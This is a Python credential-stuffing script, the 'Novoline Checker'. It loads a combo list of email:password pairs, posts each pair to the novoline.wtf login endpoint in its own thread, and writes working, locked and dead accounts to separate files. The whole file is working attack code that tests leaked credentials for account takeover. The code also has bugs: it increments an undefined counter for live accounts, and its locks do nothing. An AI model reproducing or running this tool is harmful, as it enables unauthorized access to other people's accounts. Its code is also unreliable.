import requests, threading, ctypes, random
ctypes.windll.kernel32.SetConsoleTitleW(f"Novoline Checker | by Fuzzysalt and Deimos")

combos = open(input('Combo list: ') + ".txt", "r", encoding='utf-8').readlines()
hidedeadaccounts = input('Hide dead accounts? (y/n): ').lower()
dead, live, total, locked = 0, 0, 0, 0

combolen = len(combos)
print('Imported ' + str(len(combos)) + ' lines of combos')

def FuckingBlur(thestring):
    length = len(thestring)
    return ''.join(random.choices("*", k=length))


def CheckNovoline(username_, novopassword):
    global dead, locked, live, total
    check = requests.post("https://novoline.wtf/login", data={'email': username_, 'password': novopassword})
    json = check.json()
    if json['code'] == "invalid_credentials":
        dead += 1
        total += 1
        if hidedeadaccounts == 'y':
            pass
        else:
            with threading.Lock():
                print('Dead: ' + username_ + ':' + FuckingBlur(novopassword) + ' | ' + str(total))
        f = open('Novoline_Dead.txt', 'a')
        f.write(username_ + ':' + novopassword + '\n')
    elif json['code'] == "locked":
        locked += 1
        total += 1
        with threading.Lock():
            print('Locked: ' + username_ + ':' + FuckingBlur(novopassword) + ' | ' + str(total))
        f = open('Novoline_Locked.txt', 'a')
        f.write(username_ + ':' + novopassword + '\n')
    else:
        alive += 1
        total += 1
        with threading.Lock():
            print('Alive: ' + username_ + ':' + FuckingBlur(novopassword) + ' | ' + str(total))
        f = open('Novoline_Alive.txt', 'a')
        f.write(username_ + ':' + novopassword + '\n')

def WhileTrueGaming():
    while True:
        ctypes.windll.kernel32.SetConsoleTitleW(f"Novoline Checker | by Fuzzysalt and Deimos | Dead: {dead} - Live: {live} - Locked: {locked}")
        if total == combolen:
            ctypes.windll.kernel32.SetConsoleTitleW(f"Novoline Checker | by Fuzzysalt and Deimos | Dead: {dead} - Live: {live} - Locked: {locked} | Done Checking!")
            print('Done!')
            k = input('Press enter to exit.')   # Just to make sure the user has read the output.
            break



if __name__ == '__main__':
    j = threading.Thread(target=WhileTrueGaming)
    j.start()
    for account in combos:
        gaming = account.strip()
        try:
            name, novopass = gaming.split(":")[0], gaming.split(":")[1]
            threading.Thread(target=CheckNovoline, args=(name, novopass,)).start()
        except:
            pass
    
    
    
